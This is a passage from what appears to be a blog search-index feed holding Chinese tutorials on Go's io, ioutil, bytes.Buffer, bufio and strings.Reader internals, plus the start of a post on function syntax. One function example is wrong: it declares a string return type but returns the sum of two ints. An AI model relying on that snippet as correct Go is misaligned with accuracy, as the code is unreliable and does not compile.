class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">select</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token operator">&lt;-</span>p<span class="token punctuation">.</span>done<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">writeCloseError</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>wrMu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">defer</span> p<span class="token punctuation">.</span>wrMu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> once <span class="token operator">:=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> once <span class="token operator">||</span> <span class="token function">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> once <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token punctuation">{</span>        <span class="token keyword">select</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> p<span class="token punctuation">.</span>wrCh <span class="token operator">&lt;-</span> b<span class="token punctuation">:</span>            nw <span class="token operator">:=</span> <span class="token operator">&lt;-</span>p<span class="token punctuation">.</span>rdCh            b <span class="token operator">=</span> b<span class="token punctuation">[</span>nw<span class="token punctuation">:</span><span class="token punctuation">]</span>            n <span class="token operator">+=</span> nw        <span class="token keyword">case</span> <span class="token operator">&lt;-</span>p<span class="token punctuation">.</span>done<span class="token punctuation">:</span>            <span class="token keyword">return</span> n<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">writeCloseError</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> n<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span></code></pre><h2 id="三、io-ioutil"><a href="#三、io-ioutil" class="headerlink" title="三、io/ioutil"></a>三、io/ioutil</h2><blockquote><p><code>ioutil</code>是<code>io</code>包下的一个子包，实际是对<code>io</code>的封装以提供一些便利的函数。</p></blockquote><h5 id="0x00-ioutil-ReadAll"><a href="#0x00-ioutil-ReadAll" class="headerlink" title="0x00 ioutil.ReadAll()"></a>0x00 ioutil.ReadAll()</h5><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//顾名思义，ReadAll函数会读取io.Reader的所有数据并返回。（不断读取数据，直到EOF）</span><span class="token comment" spellcheck="true">//ReadAll函数返回的是读取到的所有数据，而且成功的调用err应该始终为nil，即err=EOF的情况已经在内部实现了，ReadAll不用考虑。</span><span class="token keyword">func</span> <span class="token function">ReadAll</span><span class="token punctuation">(</span>r io<span class="token punctuation">.</span>Reader<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">readAll</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>MinRead<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h5 id="0x01-ioutil-ReadFile"><a href="#0x01-ioutil-ReadFile" class="headerlink" title="0x01 ioutil.ReadFile()"></a>0x01 ioutil.ReadFile()</h5><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// ReadFile 函数与ReadAll函数的区别只在于，ReadFile限定io.Reader为文件，即会读取整个文件的内容并返回。</span><span class="token keyword">func</span> <span class="token function">ReadFile</span><span class="token punctuation">(</span>filename <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    f<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err    <span class="token punctuation">}</span>    <span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// It's a good but not certain bet that FileInfo will tell us exactly how much to</span>    <span class="token comment" spellcheck="true">// read, so let's try it but be prepared for the answer to be wrong.</span>    <span class="token keyword">var</span> n <span class="token builtin">int64</span> <span class="token operator">=</span> bytes<span class="token punctuation">.</span>MinRead    <span class="token keyword">if</span> fi<span class="token punctuation">,</span> err <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//根据文件的大小设置缓存大小。</span>        <span class="token keyword">if</span> size <span class="token operator">:=</span> fi<span class="token punctuation">.</span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> bytes<span class="token punctuation">.</span>MinRead<span class="token punctuation">;</span> size <span class="token operator">></span> n <span class="token punctuation">{</span>            n <span class="token operator">=</span> size        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">readAll</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h5 id="0x02-ioutil-readAll"><a href="#0x02-ioutil-readAll" class="headerlink" title="0x02 ioutil.readAll()"></a>0x02 ioutil.readAll()</h5><blockquote><p>前面两个函数本质都是调用了<code>ioutil.readAll()</code>函数，因此重点分析该函数。</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// readAll reads from r until an error or EOF and returns the data it read</span><span class="token comment" spellcheck="true">// from the internal buffer allocated with a specified capacity.</span><span class="token keyword">func</span> <span class="token function">readAll</span><span class="token punctuation">(</span>r io<span class="token punctuation">.</span>Reader<span class="token punctuation">,</span> capacity <span class="token builtin">int64</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//借助bytes.Buffer实现缓存功能,详情见下文第四节。</span>    <span class="token keyword">var</span> buf bytes<span class="token punctuation">.</span>Buffer    。。。。。。    <span class="token keyword">if</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>capacity<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> capacity <span class="token punctuation">{</span>        buf<span class="token punctuation">.</span><span class="token function">Grow</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>capacity<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//分配缓存大小</span>    <span class="token punctuation">}</span>    <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> buf<span class="token punctuation">.</span><span class="token function">ReadFrom</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> buf<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> err<span class="token punctuation">}</span></code></pre><p>自己编写实现了<code>io.Reader</code>接口，用来测试的代码。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"io"</span>    <span class="token string">"io/ioutil"</span><span class="token punctuation">)</span><span class="token keyword">type</span> test <span class="token keyword">struct</span> <span class="token punctuation">{</span>    data <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>t <span class="token operator">*</span>test<span class="token punctuation">)</span> <span class="token function">Read</span><span class="token punctuation">(</span>p <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> io<span class="token punctuation">.</span>EOF    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token function">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">copy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> t<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token function">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>data <span class="token operator">=</span> t<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        n <span class="token operator">=</span> <span class="token function">copy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> t<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token function">len</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>data <span class="token operator">=</span> t<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> n<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    r <span class="token operator">:=</span> <span class="token operator">&amp;</span>test<span class="token punctuation">{</span>        data<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    d<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="四、bytes-Buffer"><a href="#四、bytes-Buffer" class="headerlink" title="四、bytes.Buffer"></a>四、bytes.Buffer</h2><blockquote><p><code>bytes.Buffer</code>实现了缓存功能。</p></blockquote><pre class=" language-Go"><code class="language-Go">type Buffer struct {    buf      []byte // contents are the bytes buf[off : len(buf)]    off      int    // read at &buf[off], write at &buf[len(buf)]    lastRead readOp // last read operation, so that Unread* can work correctly.}func NewBuffer(buf []byte) *Buffer { return &Buffer{buf: buf} }// 读取传入的io.Reader中的全部数据到缓存，缓存大小会根据数据量不断进行扩容。func (b *Buffer) ReadFrom(r io.Reader) (n int64, err error) {    b.lastRead = opInvalid    for {        i := b.grow(MinRead)  //对缓存进行扩容        b.buf = b.buf[:i]        m, e := r.Read(b.buf[i:cap(b.buf)])  //读取数据到缓存        if m < 0 {            panic(errNegativeRead)        }        b.buf = b.buf[:i+m]        n += int64(m)        if e == io.EOF {            return n, nil // e is EOF, so return nil explicitly        }        if e != nil {            return n, e        }    }}//从缓存中读取数据。func (b *Buffer) Read(p []byte) (n int, err error) {    b.lastRead = opInvalid    if b.empty() {        // Buffer is empty, reset to recover space.        b.Reset()        if len(p) == 0 {            return 0, nil        }        return 0, io.EOF    }    n = copy(p, b.buf[b.off:])    b.off += n    if n > 0 {        b.lastRead = opRead    }    return n, nil}</code></pre><h2 id="五、bufio"><a href="#五、bufio" class="headerlink" title="五、bufio"></a>五、bufio</h2><blockquote><p>Package bufio implements buffered I/O. It wraps an io.Reader or io.Writer object。</p></blockquote><h5 id="0x00-bufio-Reader"><a href="#0x00-bufio-Reader" class="headerlink" title="0x00 bufio.Reader"></a>0x00 bufio.Reader</h5><blockquote><p><code>bufio.Reader</code>用于对<code>io.Reader</code>进行二次封装实现缓存。</p><p>与上面的<code>bytes.Bufferchuan</code>区别在于，<code>bufio.Reader</code>是对<code>io.Reader</code>封装，而<code>bytes.Buffer</code>是传入<code>io.Reader</code>到<code>ReadFrom</code>方法。</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Reader <span class="token keyword">struct</span> <span class="token punctuation">{</span>    buf          <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>    rd           io<span class="token punctuation">.</span>Reader <span class="token comment" spellcheck="true">// reader provided by the client</span>    r<span class="token punctuation">,</span> w         <span class="token builtin">int</span>       <span class="token comment" spellcheck="true">// buf read and write positions</span>    err          <span class="token builtin">error</span>    lastByte     <span class="token builtin">int</span> <span class="token comment" spellcheck="true">// last byte read for UnreadByte; -1 means invalid</span>    lastRuneSize <span class="token builtin">int</span> <span class="token comment" spellcheck="true">// size of last rune read for UnreadRune; -1 means invalid</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 构造方法，将传入的iO.Reader封装到bufio.Reader中。</span><span class="token keyword">func</span> <span class="token function">NewReaderSize</span><span class="token punctuation">(</span>rd io<span class="token punctuation">.</span>Reader<span class="token punctuation">,</span> size <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">*</span>Reader <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 如果传入的io.Reader已经是bufio.Reader，那么只需要设置缓存大小即可。</span>    b<span class="token punctuation">,</span> ok <span class="token operator">:=</span> rd<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>Reader<span class="token punctuation">)</span>    <span class="token keyword">if</span> ok <span class="token operator">&amp;&amp;</span> <span class="token function">len</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>buf<span class="token punctuation">)</span> <span class="token operator">>=</span> size <span class="token punctuation">{</span>        <span class="token keyword">return</span> b    <span class="token punctuation">}</span>    <span class="token keyword">if</span> size <span class="token operator">&lt;</span> minReadBufferSize <span class="token punctuation">{</span>        size <span class="token operator">=</span> minReadBufferSize    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 如果传入的io.Reader不是bufio.Reader，就实例化一个bufio.Reader并设置缓存大小。</span>    r <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>Reader<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">,</span> rd<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 实现了使用默认大小缓存的构造方法</span><span class="token keyword">func</span> <span class="token function">NewReader</span><span class="token punctuation">(</span>rd io<span class="token punctuation">.</span>Reader<span class="token punctuation">)</span> <span class="token operator">*</span>Reader <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">NewReaderSize</span><span class="token punctuation">(</span>rd<span class="token punctuation">,</span> defaultBufSize<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>b <span class="token operator">*</span>Reader<span class="token punctuation">)</span> <span class="token function">Read</span><span class="token punctuation">(</span>p <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    n <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> b<span class="token punctuation">.</span><span class="token function">Buffered</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//Buffered()返回当前缓存中可读取的数据的长度。</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span><span class="token function">readErr</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> b<span class="token punctuation">.</span>r <span class="token operator">==</span> b<span class="token punctuation">.</span>w <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//读取位置等于写入位置，意味着当前缓存中已无未读取的数据。</span>        <span class="token keyword">if</span> b<span class="token punctuation">.</span>err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span><span class="token function">readErr</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token function">len</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//要读取的数据长度大于缓存的长度则直接从io.Reader中读取，而不从缓存中读取。</span>            <span class="token comment" spellcheck="true">// Large read, empty buffer.</span>            <span class="token comment" spellcheck="true">// Read directly into p to avoid copy.</span>            n<span class="token punctuation">,</span> b<span class="token punctuation">.</span>err <span class="token operator">=</span> b<span class="token punctuation">.</span>rd<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>            <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>                <span class="token function">panic</span><span class="token punctuation">(</span>errNegativeRead<span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> n <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>                b<span class="token punctuation">.</span>lastByte <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                b<span class="token punctuation">.</span>lastRuneSize <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> n<span class="token punctuation">,</span> b<span class="token punctuation">.</span><span class="token function">readErr</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// One read.</span>        <span class="token comment" spellcheck="true">// Do not use b.fill, which will loop.</span>        b<span class="token punctuation">.</span>r <span class="token operator">=</span> <span class="token number">0</span>        b<span class="token punctuation">.</span>w <span class="token operator">=</span> <span class="token number">0</span>        n<span class="token punctuation">,</span> b<span class="token punctuation">.</span>err <span class="token operator">=</span> b<span class="token punctuation">.</span>rd<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>buf<span class="token punctuation">)</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>            <span class="token function">panic</span><span class="token punctuation">(</span>errNegativeRead<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span><span class="token function">readErr</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        b<span class="token punctuation">.</span>w <span class="token operator">+=</span> n    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// copy as much as we can</span>    n <span class="token operator">=</span> <span class="token function">copy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> b<span class="token punctuation">.</span>buf<span class="token punctuation">[</span>b<span class="token punctuation">.</span>r<span class="token punctuation">:</span>b<span class="token punctuation">.</span>w<span class="token punctuation">]</span><span class="token punctuation">)</span>    b<span class="token punctuation">.</span>r <span class="token operator">+=</span> n    b<span class="token punctuation">.</span>lastByte <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>buf<span class="token punctuation">[</span>b<span class="token punctuation">.</span>r<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    b<span class="token punctuation">.</span>lastRuneSize <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">return</span> n<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span></code></pre><h2 id="六、strings-Reader"><a href="#六、strings-Reader" class="headerlink" title="六、strings.Reader"></a>六、strings.Reader</h2><blockquote><p>实现了将字符串作为数据源的<code>io.Reader</code>。</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Reader <span class="token keyword">struct</span> <span class="token punctuation">{</span>    s        <span class="token builtin">string</span>    i        <span class="token builtin">int64</span> <span class="token comment" spellcheck="true">// current reading index</span>    prevRune <span class="token builtin">int</span>   <span class="token comment" spellcheck="true">// index of previous rune; or &lt; 0</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">NewReader</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span>Reader <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">&amp;</span>Reader<span class="token punctuation">{</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Reader<span class="token punctuation">)</span> <span class="token function">Read</span><span class="token punctuation">(</span>b <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>i <span class="token operator">>=</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> io<span class="token punctuation">.</span>EOF    <span class="token punctuation">}</span>    r<span class="token punctuation">.</span>prevRune <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    n <span class="token operator">=</span> <span class="token function">copy</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> r<span class="token punctuation">.</span>s<span class="token punctuation">[</span>r<span class="token punctuation">.</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>i <span class="token operator">+=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—函数</title>
      <link href="2020/10/14/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%87%BD%E6%95%B0/"/>
      <url>2020/10/14/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、函数定义"><a href="#一、函数定义" class="headerlink" title="一、函数定义"></a>一、函数定义</h2><ul><li><p>Go是编译型语言，因此函数的编写顺序是无关紧要的，通常把<code>main</code>函数放于前面提高可读性。</p></li><li><p>普通函数声明：<code>fun</code>关键字、函数名、形参、返回值列表（可省略）、函数体</p><blockquote><p>func 函数名（arg1,arg2…）（返回值列表）{     …     return … }</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">,</span> y <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//int类型的形参x,y,返回值类型为string类型。</span>    <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">sub</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>z <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//形参类型相同可简写，明确指定z变量为返回值</span>        z <span class="token operator">=</span> x <span class="token operator">-</span> y   <span class="token comment" spellcheck="true">//z变量在函数体也不用再声明了</span>        <span class="token keyword">return</span>      <span class="token comment" spellcheck="true">//自动找z变量返回</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">sum</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token builtin">int</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">first</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> x <span class="token punctuation">}</span> <span class="token keyword">func</span> <span class="token function">zero</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span> <span class="token punctuation">}</span></code></pre></li><li><p>可变长参数</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span>x <span class="token operator">...</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//可变长参数必须是最后一个形参</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//[1 2 3 4]。x是一个切片，可变参数必须是最后一个参数。</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token 